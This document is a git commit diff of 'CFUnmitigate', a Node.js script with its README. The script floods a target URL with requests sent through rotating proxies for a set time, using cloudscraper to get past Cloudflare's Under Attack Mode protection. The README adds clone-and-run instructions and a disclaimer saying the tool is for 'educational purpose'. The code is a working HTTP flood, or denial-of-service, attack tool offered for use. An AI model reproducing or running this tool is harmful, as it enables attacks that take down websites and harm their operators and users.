a8f98f98513b75ee50b5413ee5a7e69917d67788
DecodeMehh <43712252+DecodeMehh@users.noreply.github.com>
2020-02-19 01:22:43 +0100

    Small changes
    Removed licensing from code.
    Added Travis build status.

--- CFUnmitigate.js
+++ CFUnmitigate.js
@@ -1,44 +1,20 @@
-/**
- * MIT License
- *
- * Copyright (c) 2020 Mrakovic
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in all
- * copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
- * SOFTWARE.
- */
-
 require('events').EventEmitter.defaultMaxListeners = 0;
-
-if (process.argv.length <= 5) {
-    console.log(`Made by Tesla.
-Usage: node CFUnmitigate.js <url> <time> <req_per_ip> <proxies>
-Usage: node CFUnmitigate.js <http://example.com> <60> <100> <http.txt>`);
-    process.exit(-1);
-}
-
 const fs = require('fs'),
     CloudScraper = require('cloudscraper'),
-    target = process.argv[2],
+    path = require('path');
+
+if (process.argv.length !== 6) {
+    console.log(`
+Usage: node ${path.basename(__filename)} <url> <time> <req_per_ip> <proxies>
+Usage: node ${path.basename(__filename)} <http://example.com> <60> <100> <http.txt>`);
+    process.exit(0);
+}
+
+const target = process.argv[2],
     time = process.argv[3],
-    threads = process.argv[4];
+    req_per_ip = process.argv[4];
 
-let proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n').filter(Boolean);
-
+let proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
 
 function send_req() {
     let proxy = proxies[Math.floor(Math.random() * proxies.length)];
@@ -63,7 +39,7 @@ function send_req() {
         // Object.keys(result).forEach(function (i, e) {
         //     console.log(i + ': ' + result[i]);
         // });
-        for (let i = 0; i < threads; ++i) {
+        for (let i = 0; i < req_per_ip; ++i) {
             CloudScraper({
                 uri: target,
                 headers: result,
@@ -84,7 +60,7 @@ setInterval(() => {
 
 setTimeout(() => {
     console.log('Attack ended.');
-    process.exit(-1)
+    process.exit(0)
 }, time * 1000);
 
 // to avoid errors
--- README.md
+++ README.md
@@ -1,15 +1,19 @@
 # CFUnmitigate
 ![APM](https://img.shields.io/apm/l/vim-mode?style=for-the-badge)
 [![cloudscraper](https://img.shields.io/badge/NPM-cloudscraper-red?logo=npm&style=for-the-badge)](https://github.com/codemanki/cloudscraper)
+[![Build Status](https://img.shields.io/travis/com/Mrakovic-ORG/CFUnmitigate?style=for-the-badge)](https://travis-ci.com/Mrakovic-ORG/CFUnmitigate)
 
-UAM Bypass only by using Cloudscraper requests.
+UAM Bypass only by using CloudScraper requests.
 
 ![uam-bypass](images/uam-bypass.png)
 
-# Install
+### Install
 ```sh
-npm i -S cloudscraper
+git clone https://github.com/Mrakovic-ORG/CFUnmitigate
+cd CFUnmitigate
+npm install
+node CFUnmitigate.js
 ```
-
+### Disclaimer
 We are not responsible for any damage done with this script, its has been made for educational purpose.
 
